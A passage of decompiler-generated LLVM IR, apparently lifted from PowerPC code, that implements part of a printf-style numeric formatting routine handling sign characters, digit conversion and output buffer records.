  %v3_10007f00 = icmp ugt i32 %v0_10007f00, %v2_10007ef8
  %v4_10007f00 = icmp eq i32 %v0_10007f00, %v2_10007ef8
  store i1 %v2_10007f00, i1* %cr7_lt.global-to-local, align 1
  store i1 %v4_10007f00, i1* %cr7_eq.global-to-local, align 1
  store i32 %v2_10007d8c, i32* %r9.global-to-local, align 4
  br i1 %v3_10007f00, label %dec_label_pc_10007f18, label %dec_label_pc_10007f0c

dec_label_pc_10007f0c:                            ; preds = %dec_label_pc_10007ef8
  store i32 %v2_10007ef8, i32* %r9.global-to-local, align 4
  %v1_10007f10 = add i32 %v0_10007efc, 1
  store i32 %v1_10007f10, i32* @r7, align 4
  store i32 %v2_10007ef8, i32* %r11.global-to-local, align 4
  br label %dec_label_pc_10007f18

dec_label_pc_10007f18:                            ; preds = %dec_label_pc_10007ef8, %dec_label_pc_10007f0c
  %v2_10007f20 = phi i32 [ %v0_10007f00, %dec_label_pc_10007ef8 ], [ %v2_10007ef8, %dec_label_pc_10007f0c ]
  %v0_10007f18 = load i32, i32* %r31.global-to-local, align 4
  %v1_10007f18 = icmp slt i32 %v0_10007f18, 103
  %v3_10007f18 = icmp eq i32 %v0_10007f18, 103
  store i1 %v1_10007f18, i1* %cr7_lt.global-to-local, align 1
  store i1 %v3_10007f18, i1* %cr7_eq.global-to-local, align 1
  store i32 0, i32* %r0.global-to-local, align 4
  %v3_10007f20 = add i32 %v2_10007f20, 1
  %v4_10007f20 = inttoptr i32 %v3_10007f20 to i8*
  store i8 0, i8* %v4_10007f20, align 1
  %v0_10007f24 = load i32, i32* %r11.global-to-local, align 4
  %v1_10007f24 = add i32 %v0_10007f24, 1
  store i32 %v1_10007f24, i32* %r11.global-to-local, align 4
  %v0_10007f28 = load i1, i1* %cr7_eq.global-to-local, align 1
  br i1 %v0_10007f28, label %dec_label_pc_10007f2c, label %dec_label_pc_10007f50

dec_label_pc_10007f2c:                            ; preds = %dec_label_pc_10007f18
  %v0_10007f2c = load i32, i32* @r7, align 4
  %v1_10007f2c = icmp slt i32 %v0_10007f2c, -4
  %v3_10007f2c = icmp eq i32 %v0_10007f2c, -4
  store i1 %v1_10007f2c, i1* %cr7_lt.global-to-local, align 1
  store i1 %v3_10007f2c, i1* %cr7_eq.global-to-local, align 1
  br i1 %v1_10007f2c, label %dec_label_pc_10007f48, label %dec_label_pc_10007f34

dec_label_pc_10007f34:                            ; preds = %dec_label_pc_10007f2c
  %v1_10007f34 = load i32, i32* %r10.global-to-local, align 4
  %v2_10007f34 = icmp sgt i32 %v1_10007f34, %v0_10007f2c
  %v3_10007f34 = icmp slt i32 %v1_10007f34, %v0_10007f2c
  %v4_10007f34 = icmp eq i32 %v1_10007f34, %v0_10007f2c
  store i1 %v2_10007f34, i1* %cr7_lt.global-to-local, align 1
  store i1 %v4_10007f34, i1* %cr7_eq.global-to-local, align 1
  br i1 %v3_10007f34, label %dec_label_pc_10007f48, label %dec_label_pc_10007f3c

dec_label_pc_10007f3c:                            ; preds = %dec_label_pc_10007f34
  %v2_10007f3c = sub i32 %v1_10007f34, %v0_10007f2c
  store i32 %v2_10007f3c, i32* %r30.global-to-local, align 4
  store i32 102, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_10007f68

dec_label_pc_10007f48:                            ; preds = %dec_label_pc_10007f34, %dec_label_pc_10007f2c
  store i32 103, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_10007f5c

dec_label_pc_10007f50:                            ; preds = %dec_label_pc_10007f18
  %v0_10007f50 = load i32, i32* %r31.global-to-local, align 4
  %v1_10007f50 = icmp slt i32 %v0_10007f50, 102
  %v3_10007f50 = icmp eq i32 %v0_10007f50, 102
  store i1 %v1_10007f50, i1* %cr7_lt.global-to-local, align 1
  store i1 %v3_10007f50, i1* %cr7_eq.global-to-local, align 1
  store i32 %v0_10007f50, i32* %r4.global-to-local, align 4
  br i1 %v3_10007f50, label %dec_label_pc_10007f68thread-pre-split, label %dec_label_pc_10007f5c

dec_label_pc_10007f5c:                            ; preds = %dec_label_pc_10007f50, %dec_label_pc_10007f48
  store i32 0, i32* %r10.global-to-local, align 4
  store i1 false, i1* %cr6_lt.global-to-local, align 1
  store i1 false, i1* %cr6_gt.global-to-local, align 1
  store i1 true, i1* %cr6_eq.global-to-local, align 1
  br label %dec_label_pc_10007f7c

dec_label_pc_10007f68thread-pre-split:            ; preds = %dec_label_pc_10007f50
  %v0_10007f68.pr = load i32, i32* @r7, align 4
  br label %dec_label_pc_10007f68

dec_label_pc_10007f68:                            ; preds = %dec_label_pc_10007f68thread-pre-split, %dec_label_pc_10007f3c
  %v0_10007f6c = phi i32 [ %v0_10007f68.pr, %dec_label_pc_10007f68thread-pre-split ], [ %v0_10007f2c, %dec_label_pc_10007f3c ]
  %v1_10007f68 = icmp slt i32 %v0_10007f6c, 0
  %v2_10007f68 = icmp sgt i32 %v0_10007f6c, 0
  %v3_10007f68 = icmp eq i32 %v0_10007f6c, 0
  store i1 %v1_10007f68, i1* %cr6_lt.global-to-local, align 1
  store i1 %v2_10007f68, i1* %cr6_gt.global-to-local, align 1
  store i1 %v3_10007f68, i1* %cr6_eq.global-to-local, align 1
  store i32 %v0_10007f6c, i32* %r10.global-to-local, align 4
  %tmp78 = icmp sgt i32 %v0_10007f6c, -1
  br i1 %tmp78, label %dec_label_pc_10007f7c, label %dec_label_pc_10007f74

dec_label_pc_10007f74:                            ; preds = %dec_label_pc_10007f68
  store i32 48, i32* %r0.global-to-local, align 4
  %v2_10007f78 = load i32, i32* %r9.global-to-local, align 4
  %v3_10007f78 = add i32 %v2_10007f78, -1
  %v4_10007f78 = inttoptr i32 %v3_10007f78 to i8*
  store i8 48, i8* %v4_10007f78, align 1
  store i32 %v3_10007f78, i32* %r9.global-to-local, align 4
  %v1_10007f9c.pre = load i32, i32* %r11.global-to-local, align 4
  %v0_10007fac.pre = load i1, i1* %cr6_lt.global-to-local, align 1
  br label %dec_label_pc_10007f7c

dec_label_pc_10007f7c:                            ; preds = %dec_label_pc_10007f68, %dec_label_pc_10007f5c, %dec_label_pc_10007f74
  %v0_10007fac = phi i1 [ %v1_10007f68, %dec_label_pc_10007f68 ], [ false, %dec_label_pc_10007f5c ], [ %v0_10007fac.pre, %dec_label_pc_10007f74 ]
  %v1_10007f9c = phi i32 [ %v1_10007f24, %dec_label_pc_10007f68 ], [ %v1_10007f24, %dec_label_pc_10007f5c ], [ %v1_10007f9c.pre, %dec_label_pc_10007f74 ]
  store i32 176, i32* %r5.global-to-local, align 4
  store i32 1, i32* %stack_var_-140, align 4
  %v0_10007f90 = load i32, i32* %r9.global-to-local, align 4
  %v1_10007f90 = add i32 %v0_10007f90, 1
  store i32 %v1_10007f90, i32* %r6.global-to-local, align 4
  store i32 0, i32* %r0.global-to-local, align 4
  %v2_10007f9c = sub i32 %v1_10007f9c, %v1_10007f90
  store i32 %v2_10007f9c, i32* %r11.global-to-local, align 4
  %v1_10007fa0 = inttoptr i32 %v0_10007f90 to i8*
  %v2_10007fa0 = load i8, i8* %v1_10007fa0, align 1
  %v3_10007fa0 = zext i8 %v2_10007fa0 to i32
  store i32 %v3_10007fa0, i32* %r9.global-to-local, align 4
  br i1 %v0_10007fac, label %dec_label_pc_1000800c, label %dec_label_pc_10007fb0

dec_label_pc_10007fb0:                            ; preds = %dec_label_pc_10007f7c
  %v0_10007fb0 = load i32, i32* %r10.global-to-local, align 4
  %v2_10007fb0 = icmp slt i32 %v0_10007fb0, %v2_10007f9c
  %v4_10007fb0 = icmp eq i32 %v0_10007fb0, %v2_10007f9c
  store i1 %v2_10007fb0, i1* %cr7_lt.global-to-local, align 1
  store i1 %v4_10007fb0, i1* %cr7_eq.global-to-local, align 1
  store i32 112, i32* %r0.global-to-local, align 4
  store i32 112, i32* %stack_var_-132, align 4
  br i1 %v2_10007fb0, label %dec_label_pc_10008004, label %dec_label_pc_10007fc4

dec_label_pc_10007fc4:                            ; preds = %dec_label_pc_10007fb0
  %v2_10007fc4 = sub i32 %v0_10007fb0, %v2_10007f9c
  store i32 %v2_10007fc4, i32* %r0.global-to-local, align 4
  %v4_10007fc4 = icmp sgt i32 %v2_10007fc4, 0
  store i32 -1, i32* %r10.global-to-local, align 4
  br i1 %v4_10007fc4, label %dec_label_pc_10007fe0, label %dec_label_pc_10007fd0

dec_label_pc_10007fd0:                            ; preds = %dec_label_pc_10007fc4
  %v2_10007fd4 = ptrtoint i32* %stack_var_-120 to i32
  store i32 %v2_10007fd4, i32* %r8.global-to-local, align 4
  store i32 0, i32* %r11.global-to-local, align 4
  br label %dec_label_pc_10008028

dec_label_pc_10007fe0:                            ; preds = %dec_label_pc_10007fc4
  store i32 ptrtoint (i32* @global_var_1000cf53.433 to i32), i32* %r9.global-to-local, align 4
  %v2_10007fec = ptrtoint i32* %stack_var_-108 to i32
  store i32 %v2_10007fec, i32* %r8.global-to-local, align 4
  store i32 0, i32* %r11.global-to-local, align 4
  store i32 176, i32* %stack_var_-120, align 4
  br label %dec_label_pc_10008028

dec_label_pc_10008004:                            ; preds = %dec_label_pc_10007fb0
  %v0_10008004 = load i1, i1* %cr6_gt.global-to-local, align 1
  br i1 %v0_10008004, label %dec_label_pc_10008014, label %dec_label_pc_10008008

dec_label_pc_10008008:                            ; preds = %dec_label_pc_10008004
  store i32 -1, i32* %r10.global-to-local, align 4
  br label %dec_label_pc_1000800c

dec_label_pc_1000800c:                            ; preds = %dec_label_pc_10007f7c, %dec_label_pc_10008008
  %v2_1000800c = ptrtoint i32* %stack_var_-132 to i32
  store i32 %v2_1000800c, i32* %r8.global-to-local, align 4
  br label %dec_label_pc_10008028

dec_label_pc_10008014:                            ; preds = %dec_label_pc_10008004
  %v2_10008014 = sub i32 %v2_10007f9c, %v0_10007fb0
  store i32 %v2_10008014, i32* %r11.global-to-local, align 4
  %v2_1000801c = add i32 %v0_10007fb0, %v1_10007f90
  store i32 %v2_1000801c, i32* %r6.global-to-local, align 4
  %v2_10008020 = ptrtoint i32* %stack_var_-120 to i32
  store i32 %v2_10008020, i32* %r8.global-to-local, align 4
  store i32 -1, i32* %r10.global-to-local, align 4
  br label %dec_label_pc_10008028

dec_label_pc_10008028:                            ; preds = %dec_label_pc_1000800c, %dec_label_pc_10007fe0, %dec_label_pc_10007fd0, %dec_label_pc_10008014
  %v1_10008054 = phi i32 [ %v2_1000800c, %dec_label_pc_1000800c ], [ %v2_10007fec, %dec_label_pc_10007fe0 ], [ %v2_10007fd4, %dec_label_pc_10007fd0 ], [ %v2_10008020, %dec_label_pc_10008014 ]
  %v0_10008034 = phi i32 [ %v2_10007f9c, %dec_label_pc_1000800c ], [ 0, %dec_label_pc_10007fe0 ], [ 0, %dec_label_pc_10007fd0 ], [ %v2_10008014, %dec_label_pc_10008014 ]
  %v3_10008028 = load i32, i32* %v2_10007bf8, align 4
  store i32 %v3_10008028, i32* %r0.global-to-local, align 4
  %v1_1000802c = and i32 %v3_10008028, 16
  store i32 %v1_1000802c, i32* %r9.global-to-local, align 4
  %v3_1000802c = icmp eq i32 %v1_1000802c, 0
  br i1 %v3_1000802c, label %dec_label_pc_10008034, label %dec_label_pc_1000804c

dec_label_pc_10008034:                            ; preds = %dec_label_pc_10008028
  %v1_10008034 = icmp slt i32 %v0_10008034, 0
  %v3_10008034 = icmp eq i32 %v0_10008034, 0
  store i1 %v1_10008034, i1* %cr7_lt.global-to-local, align 1
  store i1 %v3_10008034, i1* %cr7_eq.global-to-local, align 1
  br i1 %v3_10008034, label %dec_label_pc_1000803c, label %dec_label_pc_1000804c

dec_label_pc_1000803c:                            ; preds = %dec_label_pc_10008034
  %v0_1000803c = load i32, i32* %r31.global-to-local, align 4
  %v1_1000803c = icmp slt i32 %v0_1000803c, 103
  %v3_1000803c = icmp eq i32 %v0_1000803c, 103
  store i1 %v1_1000803c, i1* %cr7_lt.global-to-local, align 1
  store i1 %v3_1000803c, i1* %cr7_eq.global-to-local, align 1
  br i1 %v3_1000803c, label %dec_label_pc_1000806c, label %dec_label_pc_10008044

dec_label_pc_10008044:                            ; preds = %dec_label_pc_1000803c
  %v0_10008044 = load i32, i32* %r30.global-to-local, align 4
  %v1_10008044 = icmp slt i32 %v0_10008044, 0
  %v3_10008044 = icmp eq i32 %v0_10008044, 0
  store i1 %v1_10008044, i1* %cr7_lt.global-to-local, align 1
  store i1 %v3_10008044, i1* %cr7_eq.global-to-local, align 1
  %tmp79 = icmp slt i32 %v0_10008044, 1
  br i1 %tmp79, label %dec_label_pc_1000806c, label %dec_label_pc_1000804c

dec_label_pc_1000804c:                            ; preds = %dec_label_pc_10008034, %dec_label_pc_10008028, %dec_label_pc_10008044
  %v2_10008054 = inttoptr i32 %v1_10008054 to i32*
  store i32 112, i32* %v2_10008054, align 4
  store i32 ptrtoint (i32* @global_var_1000cf60.434 to i32), i32* %r9.global-to-local, align 4
  store i32 1, i32* %r0.global-to-local, align 4
  %v1_10008060 = load i32, i32* %r8.global-to-local, align 4
  %v2_10008060 = add i32 %v1_10008060, 8
  %v3_10008060 = inttoptr i32 %v2_10008060 to i32*
  store i32 ptrtoint (i32* @global_var_1000cf60.434 to i32), i32* %v3_10008060, align 4
  %v0_10008064 = load i32, i32* %r0.global-to-local, align 4
  %v1_10008064 = load i32, i32* %r8.global-to-local, align 4
  %v2_10008064 = add i32 %v1_10008064, 4
  %v3_10008064 = inttoptr i32 %v2_10008064 to i32*
  store i32 %v0_10008064, i32* %v3_10008064, align 4
  %v0_10008068 = load i32, i32* %r8.global-to-local, align 4
  %v1_10008068 = add i32 %v0_10008068, 12
  store i32 %v1_10008068, i32* %r8.global-to-local, align 4
  br label %dec_label_pc_1000806c

dec_label_pc_1000806c:                            ; preds = %dec_label_pc_10008044, %dec_label_pc_1000803c, %dec_label_pc_1000804c
  %v1_1000807c = phi i32 [ %v1_10008054, %dec_label_pc_10008044 ], [ %v1_10008054, %dec_label_pc_1000803c ], [ %v1_10008068, %dec_label_pc_1000804c ]
  %v0_1000806c = load i32, i32* %r10.global-to-local, align 4
  %v1_1000806c = add i32 %v0_1000806c, 1
  store i32 %v1_1000806c, i32* %r10.global-to-local, align 4
  %v4_1000806c = icmp eq i32 %v1_1000806c, 0
  br i1 %v4_1000806c, label %dec_label_pc_10008094, label %dec_label_pc_10008074

dec_label_pc_10008074:                            ; preds = %dec_label_pc_1000806c
  %v1_10008074 = sub i32 -1, %v0_1000806c
  store i32 176, i32* %r0.global-to-local, align 4
  %v2_1000807c = add i32 %v1_1000807c, 4
  %v3_1000807c = inttoptr i32 %v2_1000807c to i32*
  store i32 %v1_10008074, i32* %v3_1000807c, align 4
  store i32 ptrtoint (i32* @global_var_1000cf53.433 to i32), i32* %r9.global-to-local, align 4
  %v0_10008088 = load i32, i32* %r0.global-to-local, align 4
  %v1_10008088 = load i32, i32* %r8.global-to-local, align 4
  %v2_10008088 = inttoptr i32 %v1_10008088 to i32*
  store i32 %v0_10008088, i32* %v2_10008088, align 4
  %v0_1000808c = load i32, i32* %r9.global-to-local, align 4
  %v1_1000808c = load i32, i32* %r8.global-to-local, align 4
  %v2_1000808c = add i32 %v1_1000808c, 8
  %v3_1000808c = inttoptr i32 %v2_1000808c to i32*
  store i32 %v0_1000808c, i32* %v3_1000808c, align 4
  %v0_10008090 = load i32, i32* %r8.global-to-local, align 4
  %v1_10008090 = add i32 %v0_10008090, 12
  store i32 %v1_10008090, i32* %r8.global-to-local, align 4
  br label %dec_label_pc_10008094

dec_label_pc_10008094:                            ; preds = %dec_label_pc_1000806c, %dec_label_pc_10008074
  %v1_100080a0 = phi i32 [ %v1_1000807c, %dec_label_pc_1000806c ], [ %v1_10008090, %dec_label_pc_10008074 ]
  %v0_10008094 = load i32, i32* %r11.global-to-local, align 4
  %v1_10008094 = icmp slt i32 %v0_10008094, 0
  %v3_10008094 = icmp eq i32 %v0_10008094, 0
  store i1 %v1_10008094, i1* %cr7_lt.global-to-local, align 1
  store i1 %v3_10008094, i1* %cr7_eq.global-to-local, align 1
  br i1 %v3_10008094, label %dec_label_pc_100080b0, label %dec_label_pc_1000809c

dec_label_pc_1000809c:                            ; preds = %dec_label_pc_10008094
  store i32 112, i32* %r0.global-to-local, align 4
  %v0_100080a0 = load i32, i32* %r6.global-to-local, align 4
  %v2_100080a0 = add i32 %v1_100080a0, 8
  %v3_100080a0 = inttoptr i32 %v2_100080a0 to i32*
  store i32 %v0_100080a0, i32* %v3_100080a0, align 4
  %v0_100080a4 = load i32, i32* %r0.global-to-local, align 4
  %v1_100080a4 = load i32, i32* %r8.global-to-local, align 4
  %v2_100080a4 = inttoptr i32 %v1_100080a4 to i32*
  store i32 %v0_100080a4, i32* %v2_100080a4, align 4
  %v0_100080a8 = load i32, i32* %r11.global-to-local, align 4
  %v1_100080a8 = load i32, i32* %r8.global-to-local, align 4
  %v2_100080a8 = add i32 %v1_100080a8, 4
  %v3_100080a8 = inttoptr i32 %v2_100080a8 to i32*
  store i32 %v0_100080a8, i32* %v3_100080a8, align 4
  %v0_100080ac = load i32, i32* %r8.global-to-local, align 4
  %v1_100080ac = add i32 %v0_100080ac, 12
  store i32 %v1_100080ac, i32* %r8.global-to-local, align 4
  br label %dec_label_pc_100080b0

dec_label_pc_100080b0:                            ; preds = %dec_label_pc_10008094, %dec_label_pc_1000809c
  %v1_100080d8 = phi i32 [ %v1_100080a0, %dec_label_pc_10008094 ], [ %v1_100080ac, %dec_label_pc_1000809c ]
  %v0_100080b0 = load i32, i32* %r31.global-to-local, align 4
  %v1_100080b0 = icmp slt i32 %v0_100080b0, 103
  %v3_100080b0 = icmp eq i32 %v0_100080b0, 103
  store i1 %v1_100080b0, i1* %cr7_lt.global-to-local, align 1
  store i1 %v3_100080b0, i1* %cr7_eq.global-to-local, align 1
  br i1 %v3_100080b0, label %dec_label_pc_100080b8, label %dec_label_pc_100080c4

dec_label_pc_100080b8:                            ; preds = %dec_label_pc_100080b0
  %v3_100080b8 = load i32, i32* %v2_10007bf8, align 4
  store i32 %v3_100080b8, i32* %r0.global-to-local, align 4
  %v1_100080bc = and i32 %v3_100080b8, 16
  store i32 %v1_100080bc, i32* %r9.global-to-local, align 4
  %v3_100080bc = icmp eq i32 %v1_100080bc, 0
  br i1 %v3_100080bc, label %dec_label_pc_100080f0, label %dec_label_pc_100080c4

dec_label_pc_100080c4:                            ; preds = %dec_label_pc_100080b0, %dec_label_pc_100080b8
  %v0_100080c4 = load i32, i32* %r10.global-to-local, align 4
  %v1_100080c4 = load i32, i32* %r11.global-to-local, align 4
  %v2_100080c4 = sub i32 %v1_100080c4, %v0_100080c4
  store i32 %v2_100080c4, i32* %r9.global-to-local, align 4
  %v1_100080c8 = load i32, i32* %r30.global-to-local, align 4
  %v2_100080c8 = icmp sgt i32 %v1_100080c8, %v2_100080c4
  %v4_100080c8 = icmp eq i32 %v1_100080c8, %v2_100080c4
  store i1 %v2_100080c8, i1* %cr7_lt.global-to-local, align 1
  store i1 %v4_100080c8, i1* %cr7_eq.global-to-local, align 1
  br i1 %v2_100080c8, label %dec_label_pc_100080d0, label %dec_label_pc_100080f0

dec_label_pc_100080d0:                            ; preds = %dec_label_pc_100080c4
  %v2_100080d0 = sub i32 %v1_100080c8, %v2_100080c4
  store i32 176, i32* %r0.global-to-local, align 4
  %v2_100080d8 = add i32 %v1_100080d8, 4
  %v3_100080d8 = inttoptr i32 %v2_100080d8 to i32*
  store i32 %v2_100080d0, i32* %v3_100080d8, align 4
  store i32 ptrtoint (i32* @global_var_1000cf53.433 to i32), i32* %r9.global-to-local, align 4
  %v0_100080e4 = load i32, i32* %r0.global-to-local, align 4
  %v1_100080e4 = load i32, i32* %r8.global-to-local, align 4
  %v2_100080e4 = inttoptr i32 %v1_100080e4 to i32*
  store i32 %v0_100080e4, i32* %v2_100080e4, align 4
  %v0_100080e8 = load i32, i32* %r9.global-to-local, align 4
  %v1_100080e8 = load i32, i32* %r8.global-to-local, align 4
  %v2_100080e8 = add i32 %v1_100080e8, 8
  %v3_100080e8 = inttoptr i32 %v2_100080e8 to i32*
  store i32 %v0_100080e8, i32* %v3_100080e8, align 4
  %v0_100080ec = load i32, i32* %r8.global-to-local, align 4
  %v1_100080ec = add i32 %v0_100080ec, 12
  store i32 %v1_100080ec, i32* %r8.global-to-local, align 4
  br label %dec_label_pc_100080f0

dec_label_pc_100080f0:                            ; preds = %dec_label_pc_100080c4, %dec_label_pc_100080b8, %dec_label_pc_100080d0
  %v1_1000818437 = phi i32 [ %v1_100080d8, %dec_label_pc_100080c4 ], [ %v1_100080d8, %dec_label_pc_100080b8 ], [ %v1_100080ec, %dec_label_pc_100080d0 ]
  %v0_100080f0 = load i32, i32* %r4.global-to-local, align 4
  %v1_100080f0 = icmp slt i32 %v0_100080f0, 102
  %v3_100080f0 = icmp eq i32 %v0_100080f0, 102
  store i1 %v1_100080f0, i1* %cr7_lt.global-to-local, align 1
  store i1 %v3_100080f0, i1* %cr7_eq.global-to-local, align 1
  br i1 %v3_100080f0, label %dec_label_pc_10008178, label %dec_label_pc_100080f8

dec_label_pc_100080f8:                            ; preds = %dec_label_pc_100080f0
  %v0_100080f8 = load i32, i32* @r7, align 4
  %v1_100080f8 = icmp slt i32 %v0_100080f8, 0
  %v3_100080f8 = icmp eq i32 %v0_100080f8, 0
  store i1 %v1_100080f8, i1* %cr7_lt.global-to-local, align 1
  store i1 %v3_100080f8, i1* %cr7_eq.global-to-local, align 1
  store i32 %stack_var_-194.0, i32* %r5.global-to-local, align 4
  store i32 %v0_100080f8, i32* %r11.global-to-local, align 4
  store i32 43, i32* %r4.global-to-local, align 4
  %tmp80 = icmp sgt i32 %v0_100080f8, -1
  br i1 %tmp80, label %dec_label_pc_10008114, label %dec_label_pc_1000810c

dec_label_pc_1000810c:                            ; preds = %dec_label_pc_100080f8
  %v1_1000810c = sub i32 0, %v0_100080f8
  store i32 %v1_1000810c, i32* %r11.global-to-local, align 4
  store i32 45, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_10008114

dec_label_pc_10008114:                            ; preds = %dec_label_pc_100080f8, %dec_label_pc_1000810c
  %v0_1000812831 = phi i32 [ %v0_100080f8, %dec_label_pc_100080f8 ], [ %v1_1000810c, %dec_label_pc_1000810c ]
  store i32 0, i32* %r0.global-to-local, align 4
  %v2_10008118 = ptrtoint i32* %stack_var_-179 to i32
  store i32 %v2_10008118, i32* %r10.global-to-local, align 4
  store i32 0, i32* %stack_var_-179, align 4
  store i32 2, i32* %r7.global-to-local, align 4
  store i32 10, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_10008128

dec_label_pc_10008128:                            ; preds = %dec_label_pc_10008128.backedge, %dec_label_pc_10008114
  %v2_10008148 = phi i32 [ %v3_10008148, %dec_label_pc_10008128.backedge ], [ %v2_10008118, %dec_label_pc_10008114 ]
  %v0_1000812c = phi i32 [ %v0_1000812c.pre, %dec_label_pc_10008128.backedge ], [ 2, %dec_label_pc_10008114 ]
  %v1_10008128 = phi i32 [ %v1_10008128.pre, %dec_label_pc_10008128.backedge ], [ 10, %dec_label_pc_10008114 ]
  %v1_1000813c = phi i32 [ %v0_10008128.pre, %dec_label_pc_10008128.backedge ], [ %v0_1000812831, %dec_label_pc_10008114 ]
  %v2_10008128 = sdiv i32 %v1_1000813c, %v1_10008128
  store i32 %v2_10008128, i32* %r0.global-to-local, align 4
  %v1_1000812c = add i32 %v0_1000812c, 1
  store i32 %v1_1000812c, i32* @r7, align 4
  %v1_10008130 = icmp slt i32 %v1_1000812c, 3
  %v3_10008130 = icmp eq i32 %v1_1000812c, 3
  store i1 %v1_10008130, i1* %cr7_lt.global-to-local, align 1
  store i1 %v3_10008130, i1* %cr7_eq.global-to-local, align 1
  %v1_10008138 = icmp slt i32 %v2_10008128, 0
  %v2_10008138 = icmp sgt i32 %v2_10008128, 0
  %v3_10008138 = icmp eq i32 %v2_10008128, 0
  store i1 %v1_10008138, i1* %cr6_lt.global-to-local, align 1
  store i1 %v2_10008138, i1* %cr6_gt.global-to-local, align 1
  store i1 %v3_10008138, i1* %cr6_eq.global-to-local, align 1
  %tmp81 = mul i32 %v2_10008128, -10
  store i32 %v2_10008128, i32* %r11.global-to-local, align 4
  %v2_1000813c = add i32 %v1_1000813c, 48
  %v1_10008144 = add i32 %v2_1000813c, %tmp81
  store i32 %v1_10008144, i32* %r9.global-to-local, align 4
  %v1_10008148 = trunc i32 %v1_10008144 to i8
  %v3_10008148 = add i32 %v2_10008148, -1
  %v4_10008148 = inttoptr i32 %v3_10008148 to i8*
  store i8 %v1_10008148, i8* %v4_10008148, align 1
  store i32 %v3_10008148, i32* %r10.global-to-local, align 4
  %v0_1000814c = load i1, i1* %cr7_eq.global-to-local, align 1
  %v1_1000814c = load i1, i1* %cr7_lt.global-to-local, align 1
  %v2_1000814c = or i1 %v0_1000814c, %v1_1000814c
  br i1 %v2_1000814c, label %dec_label_pc_10008128.backedge, label %dec_label_pc_10008150

dec_label_pc_10008128.backedge:                   ; preds = %dec_label_pc_10008128, %dec_label_pc_10008150
  %v0_10008128.pre = load i32, i32* %r11.global-to-local, align 4
  %v1_10008128.pre = load i32, i32* %r6.global-to-local, align 4
  %v0_1000812c.pre = load i32, i32* @r7, align 4
  br label %dec_label_pc_10008128

dec_label_pc_10008150:                            ; preds = %dec_label_pc_10008128
  %v0_10008150 = load i1, i1* %cr6_eq.global-to-local, align 1
  br i1 %v0_10008150, label %dec_label_pc_10008154, label %dec_label_pc_10008128.backedge

dec_label_pc_10008154:                            ; preds = %dec_label_pc_10008150
  %v1_10008154 = add i32 %v2_10008148, -2
  store i32 %v1_10008154, i32* %r9.global-to-local, align 4
  store i32 112, i32* %r0.global-to-local, align 4
  %v1_1000815c = add i32 %v2_10008148, -3
  store i32 %v1_1000815c, i32* %r11.global-to-local, align 4
  %v0_10008160 = load i32, i32* %r4.global-to-local, align 4
  %v1_10008160 = trunc i32 %v0_10008160 to i8
  %v4_10008160 = inttoptr i32 %v1_10008154 to i8*
  store i8 %v1_10008160, i8* %v4_10008160, align 1
  %v0_10008164 = load i32, i32* %r5.global-to-local, align 4
  %v1_10008164 = trunc i32 %v0_10008164 to i8
  %v2_10008164 = load i32, i32* %r9.global-to-local, align 4
  %v3_10008164 = add i32 %v2_10008164, -1
  %v4_10008164 = inttoptr i32 %v3_10008164 to i8*
  store i8 %v1_10008164, i8* %v4_10008164, align 1
  %v0_10008168 = load i32, i32* %r0.global-to-local, align 4
  %v1_10008168 = load i32, i32* %r8.global-to-local, align 4
  %v2_10008168 = inttoptr i32 %v1_10008168 to i32*
  store i32 %v0_10008168, i32* %v2_10008168, align 4
  %v0_1000816c = load i32, i32* @r7, align 4
  %v1_1000816c = load i32, i32* %r8.global-to-local, align 4
  %v2_1000816c = add i32 %v1_1000816c, 4
  %v3_1000816c = inttoptr i32 %v2_1000816c to i32*
  store i32 %v0_1000816c, i32* %v3_1000816c, align 4
  %v0_10008170 = load i32, i32* %r11.global-to-local, align 4
  %v1_10008170 = load i32, i32* %r8.global-to-local, align 4
  %v2_10008170 = add i32 %v1_10008170, 8
  %v3_10008170 = inttoptr i32 %v2_10008170 to i32*
  store i32 %v0_10008170, i32* %v3_10008170, align 4
  %v0_10008174 = load i32, i32* %r8.global-to-local, align 4
  %v1_10008174 = add i32 %v0_10008174, 12
  store i32 %v1_10008174, i32* %r8.global-to-local, align 4
  br label %dec_label_pc_10008178

dec_label_pc_10008178:                            ; preds = %dec_label_pc_100080f0, %dec_label_pc_10007ccc, %dec_label_pc_10008154
  %v0_100081f4 = phi i32 [ %v1_1000818437, %dec_label_pc_100080f0 ], [ %v2_10007cd8, %dec_label_pc_10007ccc ], [ %v1_10008174, %dec_label_pc_10008154 ]
  %v2_10008178 = ptrtoint i32* %stack_var_-140 to i32
  store i32 %v2_10008178, i32* %r9.global-to-local, align 4
  %v1_10008188.pre = load i32, i32* %r28.global-to-local, align 4
  br label %dec_label_pc_1000817c

dec_label_pc_1000817c:                            ; preds = %dec_label_pc_1000817c, %dec_label_pc_10008178
  %v1_10008188 = phi i32 [ %v2_10008188, %dec_label_pc_1000817c ], [ %v1_10008188.pre, %dec_label_pc_10008178 ]
  %v0_1000817c = phi i32 [ %v1_10008180, %dec_label_pc_1000817c ], [ %v2_10008178, %dec_label_pc_10008178 ]
  %v1_1000817c = inttoptr i32 %v0_1000817c to i32*
  %v2_1000817c = load i32, i32* %v1_1000817c, align 4
  store i32 %v2_1000817c, i32* %r0.global-to-local, align 4
  %v1_10008180 = add i32 %v0_1000817c, 12
  store i32 %v1_10008180, i32* %r9.global-to-local, align 4
  %v2_10008184 = icmp ult i32 %v1_10008180, %v0_100081f4
  %v2_10008188 = sub i32 %v1_10008188, %v2_1000817c
  store i32 %v2_10008188, i32* @r28, align 4
  br i1 %v2_10008184, label %dec_label_pc_1000817c, label %dec_label_pc_10008190

dec_label_pc_10008190:                            ; preds = %dec_label_pc_1000817c
  %v4_10008184 = icmp eq i32 %v1_10008180, %v0_100081f4
  store i1 false, i1* %cr7_lt.global-to-local, align 1
  store i1 %v4_10008184, i1* %cr7_eq.global-to-local, align 1
  %v3_10008190 = load i8, i8* %stack_var_-200, align 1
  store i32 160, i32* %r10.global-to-local, align 4
  store i32 160, i32* %stack_var_-156, align 4
  store i32 %v0_100081f4, i32* @r30, align 4
  %tmp85 = icmp sgt i8 %v3_10008190, 0
  %v1_100081a4 = zext i1 %tmp85 to i32
  store i32 %v1_100081a4, i32* %r9.global-to-local, align 4
  %v2_100081a8 = ptrtoint i8* %stack_var_-200 to i32
  store i32 %v2_100081a8, i32* %r0.global-to-local, align 4
  %v2_100081ac = sub i32 %v2_10008188, %v1_100081a4
  store i32 %v2_100081ac, i32* %r11.global-to-local, align 4
